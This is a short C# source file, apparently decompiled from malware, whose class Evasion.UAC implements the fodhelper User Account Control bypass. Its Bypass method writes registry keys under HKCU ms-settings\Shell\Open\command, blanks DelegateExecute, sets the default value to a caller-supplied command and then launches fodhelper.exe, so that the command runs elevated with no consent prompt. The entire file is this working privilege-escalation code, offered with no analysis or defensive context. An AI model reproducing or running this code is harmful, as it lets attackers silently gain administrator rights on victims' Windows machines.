using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;

namespace Evasion
{
	// Token: 0x0200001D RID: 29
	[global::System.Runtime.CompilerServices.NullableContext(1)]
	[global::System.Runtime.CompilerServices.Nullable(0)]
	public class UAC
	{
		// Token: 0x0600003C RID: 60 RVA: 0x00004B30 File Offset: 0x00002D30
		public static void Bypass(string A_0)
		{
			Process.Start("powershell.exe", UAC.psCMD1).WaitForExit();
			Process.Start("powershell.exe", UAC.psCMD2).WaitForExit();
			Process.Start("powershell.exe", string.Format(UAC.psCMD3, A_0)).WaitForExit();
			Process.Start("powershell.exe", "fodhelper.exe").WaitForExit();
		}

		// Token: 0x0400003E RID: 62
		public static readonly string psCMD1 = "New-Item “HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command” -Force";

		// Token: 0x0400003F RID: 63
		public static readonly string psCMD2 = "New-ItemProperty -Path “HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command” -Name “DelegateExecute” -Value “” -Force";

		// Token: 0x04000040 RID: 64
		public static readonly string psCMD3 = "Set-ItemProperty -Path “HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command” -Name “(default)” -Value \"{0}\" -Force";
	}
}
